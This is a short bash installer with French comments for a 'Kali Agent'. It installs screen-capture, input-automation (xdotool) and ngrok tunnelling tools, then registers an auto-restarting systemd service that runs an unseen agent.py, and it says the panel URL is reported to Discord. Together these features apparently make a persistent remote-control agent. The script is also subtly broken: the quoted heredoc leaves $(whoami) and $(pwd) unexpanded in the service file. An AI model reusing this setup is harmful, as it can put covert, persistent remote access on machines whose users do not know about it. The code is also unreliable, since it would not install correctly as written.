#!/bin/bash
# Kali Agent Installer - Tout-en-un

echo "[+] Installation de l'agent Kali..."
cd "$(dirname "$0")"

# Update
sudo apt update -y

# Install dependencies
echo "[+] Installation des dépendances..."
sudo apt install -y python3 python3-pip python3-venv ngrok xdotool xdg-utils

# Python packages
echo "[+] Installation des packages Python..."
pip3 install flask flask-socketio requests pillow opencv-python mss pyngrok 2>/dev/null

# Create service for autostart
echo "[+] Création du service systemd..."
cat << 'EOF' | sudo tee /etc/systemd/system/kali-agent.service > /dev/null
[Unit]
Description=Kali Agent Panel
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$(pwd)
ExecStart=/usr/bin/python3 $(pwd)/agent.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable kali-agent.service

echo ""
echo "[+] Installation terminée !"
echo "[+] Pour lancer maintenant: sudo systemctl start kali-agent"
echo "[+] Pour voir les logs: sudo journalctl -u kali-agent -f"
echo ""
echo "[+] Le panel web sera accessible et l'URL envoyée sur Discord."
